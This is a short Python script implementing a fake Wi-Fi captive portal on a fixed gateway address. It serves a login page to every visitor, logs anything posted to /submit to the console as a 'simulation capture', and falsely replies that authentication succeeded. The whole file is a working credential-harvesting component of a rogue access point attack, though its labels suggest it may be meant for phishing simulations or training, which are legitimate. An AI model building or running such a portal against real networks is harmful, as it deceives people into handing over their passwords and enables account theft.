import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer

GATEWAY_IP = "192.168.4.1"
PORT = 80

class CaptivePortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        with open("captive.html", "r") as f:
            html = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(html, "utf-8"))

    def do_POST(self):
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            print("\n" + "="*40)
            print(f"[!] SIMULATION CAPTURE: {post_data}")
            print("="*40 + "\n")
            sys.stdout.flush()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h2>Authentication successful. Reconnecting...</h2>")
        else:
            self.do_GET()

server = HTTPServer((GATEWAY_IP, PORT), CaptivePortalHandler)
server.serve_forever()
